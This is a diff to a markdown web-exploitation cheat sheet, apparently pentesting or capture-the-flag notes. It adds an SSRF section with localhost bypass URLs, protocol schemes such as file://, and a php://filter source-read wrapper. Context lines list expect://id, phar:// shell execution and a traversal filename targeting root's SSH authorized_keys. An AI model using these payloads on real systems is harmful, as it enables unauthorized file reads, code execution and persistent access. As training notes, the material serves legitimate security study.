@@ -9,6 +9,9 @@
   - [File Upload](#file-upload)
     - [Filters](#filters)
     - [Zip File Upload](#zip-file-upload)
+  - [Server Side Request Forgery](#server-side-request-forgery)
+    - [Localhost Bypass](#localhost-bypass)
+    - [Protocols](#protocols)
   - [Regex Bypass](#regex-bypass)
   - [NoSQL-Injection](#nosql-injection)
   - [XML External Entities](#xml-external-entities)
@@ -71,7 +74,8 @@ gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
   - web-app files e.g. ``.htaccess`` and ``config.php`` 
 
 ### PHP Backend
-- PHP wrappers
+- Wrappers
+  - ``php://filter/convert.base64-encode/resource=index.php``
   - ``expect://id``
   - ``phar://exploit.zip/shell``: upload phar/zip archive and execute PHP file in the archive
   - [PHP filter chain](https://github.com/synacktiv/php_filter_chain_generator)
@@ -106,6 +110,34 @@ gobuster vhost -u http://<target-ip> -w <wordlist> --append-domain
 - upload zip file with symlinks $\Rightarrow$ file read
 - write files with path traversal through file names e.g. file with name ``../../../../../root/.ssh/authorized_keys``
 - zip file upload + LFI + PHP backend $\Rightarrow$ phar injection
+
+## Server Side Request Forgery
+
+- try to access internal websites or resources
+- fuzz for internal open ports
+
+### Localhost Bypass
+
+```
+http://localhost:80/
+http://127.0.0.1:80/
+http://127.0.1:80/
+http://127.1:80/
+http://127.000000000000000.1:80/
+http://0:80/
+http:@0:80/
+http://[::]:80/
+http://[0000::1]:80/
+http://[::ffff:127.0.0.1]:80/
+http://[0:0:0:0:0:ffff:127.0.0.1]:80/
+```
+
+### Protocols
+
+- ``file://``: read local file
+- ``http://``: perform http request
+- ``dict://``: access word lists
+- ``sftp://``: connect to sftp server
 
 ## Regex Bypass
 
